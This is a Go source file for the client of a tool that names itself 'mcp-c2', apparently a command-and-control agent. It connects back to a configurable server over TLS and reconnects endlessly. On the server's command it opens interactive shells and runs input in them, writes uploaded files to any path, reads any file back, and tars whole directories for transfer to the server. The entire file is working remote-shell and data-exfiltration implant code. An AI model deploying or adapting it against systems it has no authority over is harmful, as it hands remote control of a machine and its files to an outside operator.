package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"encoding/json"
	"flag"
	"io"
	"io/fs"
	"log"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/debugmcp/mcp-c2/internal/embedded"
	"github.com/debugmcp/mcp-c2/internal/proto"
	"github.com/debugmcp/mcp-c2/internal/session"
	"github.com/debugmcp/mcp-c2/internal/transport"
)

func main() {
	server := flag.String("server", "localhost:8443", "server address, e.g. 192.168.1.1:8443")
	flag.Parse()

	// Parse server address, auto-detect scheme + SNI hostname
	serverHost := *server
	sni := *server
	if h, _, err := netSplit(serverHost); err == nil && h != "" {
		sni = h
	}
	serverURL := "https://" + serverHost + "/c2"

	log.Printf("mcp-c2 client %s/%s — connecting to %s", runtime.GOOS, runtime.GOARCH, serverURL)

	tlsCfg, err := embedded.TLSConfig(sni)
	if err != nil {
		log.Fatalf("tls: %v", err)
	}

	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	mgr := session.NewManager()
	backoff := time.Second

	for {
		ctx := context.Background()
		d := &transport.ClientDialer{
			ServerURL:    serverURL,
			TLSConfig:    tlsCfg,
			Hostname:     hostname,
			ClientIDHint: hostname + "-" + runtime.GOOS,
			OnAuth: func(ok bool, id, msg string) {
				if ok {
					log.Printf("connected as client_id=%s", id)
					backoff = time.Second
				} else {
					log.Printf("auth rejected: %s", msg)
				}
			},
			OnFrame: func(f *proto.Frame, send func(proto.FrameType, any) error, reply func(proto.FrameType, any) error) {
				handleFrame(ctx, mgr, f, send, reply)
			},
		}
		if err := d.Dial(ctx); err != nil {
			log.Printf("connection ended: %v", err)
		}
		log.Printf("reconnecting in %s", backoff)
		time.Sleep(backoff)
		if backoff < 30*time.Second {
			backoff *= 2
		}
	}
}

// tarPaths creates a tar.gz archive of the given paths (files or directories).
// Directories are walked recursively. Symlinks are skipped.
func tarPaths(paths []string) ([]byte, error) {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)

	for _, root := range paths {
		root = filepath.Clean(root)
		info, err := os.Lstat(root)
		if err != nil {
			return nil, err
		}
		// Skip symlinks
		if info.Mode()&os.ModeSymlink != 0 {
			continue
		}
		if info.IsDir() {
			prefix := root
			if !strings.HasSuffix(prefix, string(filepath.Separator)) {
				prefix += string(filepath.Separator)
			}
			err = filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
				if err != nil {
					return err
				}
				info, err := d.Info()
				if err != nil {
					return err
				}
				// Skip symlinks
				if info.Mode()&os.ModeSymlink != 0 {
					return nil
				}
				// Build header
				link := ""
				if info.Mode()&os.ModeSymlink != 0 {
					link, _ = os.Readlink(path)
				}
				hdr, err := tar.FileInfoHeader(info, link)
				if err != nil {
					return err
				}
				// Use relative path as archive name
				hdr.Name = strings.TrimPrefix(path, root)
				if hdr.Name == "" {
					hdr.Name = filepath.Base(root)
				}
				if d.IsDir() && !strings.HasSuffix(hdr.Name, "/") {
					hdr.Name += "/"
				}
				if err := tw.WriteHeader(hdr); err != nil {
					return err
				}
				if info.Mode().IsRegular() {
					f, err := os.Open(path)
					if err != nil {
						return err
					}
					defer f.Close()
					if _, err := io.Copy(tw, f); err != nil {
						return err
					}
				}
				return nil
			})
		} else {
			// Single file
			hdr, err := tar.FileInfoHeader(info, "")
			if err != nil {
				return nil, err
			}
			hdr.Name = filepath.Base(root)
			if err := tw.WriteHeader(hdr); err != nil {
				return nil, err
			}
			f, err := os.Open(root)
			if err != nil {
				return nil, err
			}
			defer f.Close()
			if _, err := io.Copy(tw, f); err != nil {
				return nil, err
			}
		}
		if err != nil {
			return nil, err
		}
	}

	if err := tw.Close(); err != nil {
		return nil, err
	}
	if err := gw.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func netSplit(hostPort string) (host, port string, err error) {
	u, err := url.Parse("https://" + hostPort)
	if err != nil {
		return "", "", err
	}
	return u.Hostname(), u.Port(), nil
}

func handleFrame(ctx context.Context, mgr *session.Manager, f *proto.Frame, send func(proto.FrameType, any) error, reply func(proto.FrameType, any) error) {
	switch f.Type {
	case proto.FrameSessionOpen:
		var p proto.SessionOpenPayload
		if err := json.Unmarshal(f.Payload, &p); err != nil {
			_ = reply(proto.FrameError, proto.ErrorPayload{Code: "bad_session_open", Message: err.Error()})
			return
		}
		if p.SessionID == "" {
			p.SessionID = proto.NewID()
		}
		s, interactive, err := mgr.Open(ctx, p.SessionID, p.Shell)
		if err != nil {
			_ = reply(proto.FrameError, proto.ErrorPayload{Code: "session_open_failed", Message: err.Error()})
			return
		}
		_ = reply(proto.FrameSessionOpen, proto.SessionOpenResult{SessionID: s.ID, Interactive: interactive})
		go func() {
			for out := range s.Output() {
				_ = send(proto.FrameOutputChunk, proto.OutputChunkPayload{SessionID: out.SessionID, Data: out.Data, Alive: out.Alive, ExitCode: out.ExitCode})
			}
		}()
	case proto.FrameCmdInput:
		var p proto.CommandInputPayload
		if err := json.Unmarshal(f.Payload, &p); err != nil {
			_ = reply(proto.FrameError, proto.ErrorPayload{Code: "bad_cmd_input", Message: err.Error()})
			return
		}
		if err := mgr.Write(p.SessionID, p.Text, p.AppendNewline); err != nil {
			_ = reply(proto.FrameError, proto.ErrorPayload{Code: "cmd_input_failed", Message: err.Error()})
			return
		}
		_ = reply(proto.FrameAck, proto.AckPayload{ForFrameID: f.ID})
	case proto.FrameInterrupt:
		var p proto.SessionClosePayload
		_ = json.Unmarshal(f.Payload, &p)
		if err := mgr.Interrupt(p.SessionID); err != nil {
			_ = reply(proto.FrameError, proto.ErrorPayload{Code: "interrupt_failed", Message: err.Error()})
			return
		}
		_ = reply(proto.FrameAck, proto.AckPayload{ForFrameID: f.ID})
	case proto.FrameSessionClose:
		var p proto.SessionClosePayload
		_ = json.Unmarshal(f.Payload, &p)
		if err := mgr.Close(p.SessionID); err != nil {
			_ = reply(proto.FrameError, proto.ErrorPayload{Code: "close_failed", Message: err.Error()})
			return
		}
		_ = reply(proto.FrameAck, proto.AckPayload{ForFrameID: f.ID})
	case proto.FrameAlive:
		var p proto.SessionClosePayload
		_ = json.Unmarshal(f.Payload, &p)
		_, ok := mgr.Get(p.SessionID)
		_ = reply(proto.FrameAlive, proto.AlivePayload{SessionID: p.SessionID, Alive: ok})
	case proto.FrameFileUpload:
		var m map[string]any
		if err := json.Unmarshal(f.Payload, &m); err != nil {
			_ = reply(proto.FrameError, proto.ErrorPayload{Code: "bad_file", Message: err.Error()})
			return
		}
		cmd, _ := m["command"].(string)
		path, _ := m["path"].(string)
		if cmd == "list" {
			entries, err := os.ReadDir(path)
			if err != nil {
				_ = reply(proto.FrameError, proto.ErrorPayload{Code: "list_failed", Message: err.Error()})
				return
			}
			files := []map[string]any{}
			for _, e := range entries {
				info, _ := e.Info()
				size := int64(0)
				isDir := e.IsDir()
				if info != nil {
					size = info.Size()
				}
				files = append(files, map[string]any{"name": e.Name(), "size": size, "is_dir": isDir})
			}
			_ = reply(proto.FrameFileAck, files)
			return
		}
		if cmd == "upload" {
			data, _ := json.Marshal(f.Payload)
			var up struct {
				Data      []byte `json:"data"`
				Path      string `json:"path"`
				Overwrite bool   `json:"overwrite"`
			}
			if err := json.Unmarshal(data, &up); err != nil {
				_ = reply(proto.FrameError, proto.ErrorPayload{Code: "bad_upload", Message: err.Error()})
				return
			}
			if err := os.WriteFile(up.Path, up.Data, 0o640); err != nil {
				_ = reply(proto.FrameError, proto.ErrorPayload{Code: "write_failed", Message: err.Error()})
				return
			}
			_ = reply(proto.FrameFileAck, map[string]string{"path": up.Path, "status": "ok"})
			return
		}
	case proto.FrameFileDownload:
		var m map[string]any
		_ = json.Unmarshal(f.Payload, &m)
		path, _ := m["path"].(string)
		data, err := os.ReadFile(path)
		if err != nil {
			_ = reply(proto.FrameError, proto.ErrorPayload{Code: "read_failed", Message: err.Error()})
			return
		}
		_ = reply(proto.FrameFileDownload, proto.FileTransferPayload{Direction: "download", TempPath: path, Data: data, FileSHA256: "", Finalize: true})
	case proto.FrameDirDownload:
		var p proto.DirDownloadPayload
		if err := json.Unmarshal(f.Payload, &p); err != nil {
			_ = reply(proto.FrameError, proto.ErrorPayload{Code: "bad_dir_download", Message: err.Error()})
			return
		}
		data, err := tarPaths(p.Paths)
		if err != nil {
			_ = reply(proto.FrameError, proto.ErrorPayload{Code: "tar_failed", Message: err.Error()})
			return
		}
		_ = reply(proto.FrameFileAck, proto.FileTransferPayload{
			TransferID: p.TransferID,
			Direction:  "download",
			Data:       data,
			Finalize:   true,
		})
	default:
		_ = reply(proto.FrameError, proto.ErrorPayload{Code: "unsupported_frame", Message: string(f.Type)})
	}
}
